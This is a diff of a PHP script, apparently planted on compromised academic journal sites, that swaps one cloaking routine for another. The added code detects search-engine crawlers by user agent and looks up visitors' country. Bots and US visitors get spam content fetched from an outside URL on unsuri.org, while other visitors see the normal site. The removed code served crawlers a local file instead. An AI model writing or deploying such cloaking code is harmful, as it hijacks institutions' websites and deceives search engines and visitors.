@@ -1,18 +1,31 @@
-<?php
-function is_google_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
     }
-    return false;
+    return null;
 }
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents('/home/u561369982/domains/poltekkesbengkulu.ac.id/public_html/ojs/js/media.js');
-    echo $bot_content;
-    exit;
-} else {
-    include('mains.php');
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
+
+$Zhyven = "https://unsuri.org/ojs/alfatehjournaluodiyalaeduiq.txt";
+
+if (is_bot()) {
+    echo @file_get_contents($Zhyven);
     exit;
 }
-?> 
+
+if (getUserCountry() === "US") {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo @file_get_contents($Zhyven);
+    exit();
+}
